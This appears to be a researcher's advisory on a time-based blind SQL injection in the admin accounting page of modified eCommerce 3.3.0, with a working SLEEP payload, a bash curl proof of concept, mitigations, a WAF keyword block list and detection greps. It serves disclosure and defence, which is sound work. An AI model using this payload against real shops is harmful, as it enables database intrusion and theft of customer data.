# Security Advisory: SQL Injection (Time-Based Blind) in admin/accounting.php

> **Identifier:** Pending CVE assignment
> **Publication Date:** 16/11/2026
> **Last Updated:** 16/11/2026
> **Severity:** High
> **CVSS:** 7.2 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
> **CWE:** CWE-89: Improper Neutralization of Special Elements used in an SQL Command
> **Status:** Unpatched

---

## 1. Executive Summary

modified eCommerce Shopsoftware v3.3.0 is affected by a time-based blind SQL injection vulnerability in `admin/accounting.php`. An authenticated administrator can inject arbitrary SQL through the `access[]` POST array parameter, which is inserted directly into the SET clause of an UPDATE query without sanitization. The vulnerability allows full database read/write and potential OS command execution via SQL. No official fix is available as of this date.

---

## 2. Affected Products

| Product / Component | Affected Versions | Fixed Version | Status |
|---|---|---|---|
| modified eCommerce Shopsoftware | ≤ 3.3.0 (rev 16825) | None | Affected |
| Component: admin/accounting.php | rev 16825 | None | Affected |

- **Repository / Ecosystem:** https://github.com/modified-shop/modified-shop
- **Evaluated stack:** PHP 8.1.34, Apache 2.4, MariaDB 10.6, Debian Linux (Docker)

### Unaffected Products

- Versions prior to the introduction of the `accounting.php` admin panel not evaluated.

---

## 3. Vulnerability Description

The `admin/accounting.php` file processes an array of access permission keys via `$_POST['access']`. Each element of this array is used directly as a column name in the SET clause of a SQL UPDATE statement without passing through `xtc_db_input()` or any sanitization function. The application's `Inputfilter` class only sanitizes keys that appear in its whitelist; `access` is not listed, and array values are not recursively sanitized.

**Root cause:**

```php
// admin/accounting.php:42–45
if (isset($_POST['access'])) foreach($_POST['access'] as $key){
    xtc_db_query("UPDATE ".TABLE_ADMIN_ACCESS."
                     SET ".$key." = '1'
                   WHERE customers_id = '".(int)$_GET['cID']."'");
}
// $key comes from $_POST['access'][] with no call to xtc_db_input()
// The value is placed directly in the SET clause, before the = sign
```

### Necessary Conditions

- **Authentication:** Admin (customers_status = 0, account_type = 0)
- **User interaction:** None
- **Attack vector:** Network
- **Preconditions:** Valid admin session and CSRF token (obtainable through normal admin login)

---

## 4. Impact

An attacker with admin credentials can read any data from the database (including customer PII, password hashes, payment data), modify or delete database records, and potentially execute OS commands via `LOAD_FILE()` / `INTO OUTFILE` depending on database privileges.

- **Confidentiality:** High — full database read access
- **Integrity:** High — arbitrary UPDATE/INSERT/DELETE via stacked queries or subqueries
- **Availability:** High — database disruption possible via sleep/heavy queries

---

## 5. Classification

### CVSS

- **Score:** 7.2
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`

| Metric | Value |
|---|---|
| Attack Vector (AV) | Network |
| Attack Complexity (AC) | Low |
| Privileges Required (PR) | High |
| User Interaction (UI) | None |
| Scope (S) | Unchanged |
| Confidentiality (C) | High |
| Integrity (I) | High |
| Availability (A) | High |

### CWE

- CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')

### CAPEC

- CAPEC-7: Blind SQL Injection

---

## 6. Exploitation Scenario

1. Attacker obtains admin credentials (brute-force, credential stuffing, or social engineering).
2. Attacker logs into the admin panel and obtains a valid session cookie and CSRF token from any admin page.
3. Attacker sends a POST request to `accounting.php?action=save&cID=2` with `access[]=<payload>`.
4. The payload is embedded in the SQL SET clause, allowing time-based blind extraction of data via `SLEEP()`.
5. Database contents (users, passwords, configuration) are exfiltrated record by record.

---

## 7. Technical Evidence

### Affected Component

```text
File(s): admin/accounting.php (lines 42–45)
Parameter(s): access[] (POST array)
Method: POST · Authentication: Admin required
```

### Example Request

```http
POST /admin/accounting.php?cID=2&action=save HTTP/1.1
Host: TARGET
Cookie: MODsid=<SESSION_ID>
Content-Type: application/x-www-form-urlencoded

<CSRF_NAME>=<CSRF_VALUE>&access[]=configuration+%3D+SLEEP(3)+--+-
```

### Observed Response

```text
HTTP/1.1 200 OK
[Response time: ~3033ms — confirming SLEEP(3) execution]
```

### Result

Reproduced in an authorized Docker lab running modified eCommerce v3.3.0. The injection was confirmed non-destructively using `SLEEP(3)`. Response time of 3033ms (expected ≥3000ms) confirms server-side SQL execution. Test was performed without modifying or extracting real data.

**Evidence:** 3033ms response time vs <50ms baseline on the same endpoint.

---

## 8. Proof of Concept

For authorized environments only. Demonstrates time-based blind injection via response delay.

```bash
#!/bin/bash
# V01 PoC — SQLi Time-Based Blind in accounting.php
# Requires: valid admin session (MODsid) and CSRF token

TARGET="http://localhost:9080"
SID="<ADMIN_SESSION_ID>"
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"

# Step 1: Obtain CSRF token from any admin page
PAGE=$(curl -s -b "MODsid=$SID" -H "User-Agent: $UA" "$TARGET/admin/accounting.php?cID=2")
CSRF_NAME=$(echo "$PAGE" | grep -oP 'name="[A-Za-z0-9]{5,8}" value="[A-Za-z0-9]{30,40}"' | head -1 | grep -oP 'name="\K[^"]+')
CSRF_VALUE=$(echo "$PAGE" | grep -oP 'name="[A-Za-z0-9]{5,8}" value="[A-Za-z0-9]{30,40}"' | head -1 | grep -oP 'value="\K[^"]+')

# Step 2: Send payload — SLEEP(3) in SET clause
START=$(date +%s%3N)
HTTP=$(curl -s -o /dev/null -w "%{http_code}" \
  -b "MODsid=$SID" -H "User-Agent: $UA" \
  -X POST "$TARGET/admin/accounting.php?cID=2&action=save" \
  -d "${CSRF_NAME}=${CSRF_VALUE}" \
  --data-urlencode "access[]=configuration = SLEEP(3) -- -")
END=$(date +%s%3N)
ELAPSED=$((END - START))

echo "HTTP: $HTTP | Elapsed: ${ELAPSED}ms"
# Expected output: HTTP: 200 | Elapsed: ~3033ms
```

### Expected Result

```text
HTTP: 200 | Elapsed: 3033ms
# Delay ≥3000ms confirms SLEEP(3) was executed server-side
```

### PoC Limitations

- Does not cause service disruption.
- Does not modify or remove third-party data.
- Does not create persistence or backdoors.
- Does not contain real credentials.
- Does not automate mass exploitation.

---

## 9. Reproduction Steps

1. Set up an authorized instance of modified eCommerce v3.3.0 (rev 16825).
2. Log in as admin (customers_status=0, account_type=0).
3. Obtain CSRF token from any admin page (e.g., accounting.php?cID=2).
4. Send POST to `accounting.php?cID=2&action=save` with `access[]=configuration = SLEEP(3) -- -`.
5. Observe that the response takes ≥3 seconds.
6. Compare: without the payload the same request returns in <100ms.

---

## 10. Mitigation

Until an official fix is available:

- Sanitize all `access[]` values through `xtc_db_input()` before concatenation into SQL.
- Use parameterized queries / prepared statements for all database operations.
- Restrict admin panel access via IP allowlist or VPN.
- Enable a WAF rule blocking `SLEEP(`, `BENCHMARK(`, `AND 1=1`, `--` patterns in POST bodies.
- Review admin access logs for anomalous timing patterns.

> Mitigations reduce risk but may not completely eliminate the vulnerability.

---

## 11. Fix

**No official fix as of 16/11/2026.**

Recommended vendor change:

```php
// Vulnerable:
xtc_db_query("UPDATE ".TABLE_ADMIN_ACCESS." SET ".$key." = '1' WHERE ...");

// Fixed — use column whitelist:
$allowed_columns = ['orders', 'products', 'customers', 'configuration', /* ... */];
if (in_array($key, $allowed_columns, true)) {
    xtc_db_query("UPDATE ".TABLE_ADMIN_ACCESS." SET ".xtc_db_input($key)." = '1' WHERE ...");
}
```

1. Apply the fix above and redeploy.
2. Invalidate all active admin sessions.
3. Rotate database credentials.
4. Review logs for prior exploitation.

---

## 12. Detection and Indicators

Possible exploitation indicators:

- POST requests to `/admin/accounting.php` with response times ≥ 2 seconds.
- `access[]` values containing SQL keywords: `SLEEP`, `BENCHMARK`, `UNION`, `SELECT`, `--`.
- Unusual UPDATE statements in the MySQL slow query log against `admin_access` table.

### Example Log Search

```text
# Apache access log
grep "accounting.php" access.log | awk '$NF > 2000'

# MySQL slow query log
grep -A2 "TABLE_ADMIN_ACCESS" slow.log | grep "SLEEP\|UNION\|SELECT"
```

---

## 13. Disclosure Timeline

| Date | Event |
|---|---|
| 16/11/2026 | Vulnerability identified (static analysis + dynamic testing) |
| 16/11/2026 | Confirmed in authorized Docker lab |
| 16/11/2026 | Disclosure package prepared |
| pending | Vendor notified |
| pending | CVE requested or reserved |
| pending | Fix made available |
| pending | Advisory published |

---

## 14. Vendor Communication

- **Vendor / Maintainer:** modified-shop.org team
- **Channel used:** Pending — to be submitted via GitHub Security Advisory
- **Date of first notification:** Pending
- **Response status:** Awaiting response
- **Vendor position:** N/A

---

## 15. Credits

- **Researcher:** vinniboy021 (@vinniboy021)
- **Organization:** Independent security researcher
- **Contact:** vinniboy021@gmail.com / https://github.com/vinniboy021

---

## 16. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html
- CVSS calculator: https://www.first.org/cvss/calculator/3.1
- Product repository: https://github.com/modified-eCommerce/modified-shop
- CAPEC-7: https://capec.mitre.org/data/definitions/7.html

---

## 17. Revision History

| Version | Date | Change |
|---|---|---|
| 1.0 | 16/11/2026 | Initial publication |

---

## 18. Legal Notice

This advisory is published for educational, defensive, and security improvement purposes.

The information was obtained in an authorized environment and disclosed responsibly. The author does not encourage unauthorized access, service disruption, privacy violations, or any illegal activity. Use of this information is the reader's responsibility.

---

## 19. Contact

- **Email:** vinniboy021@gmail.com
- **Repository:** https://github.com/vinniboy021-blip/Advisory
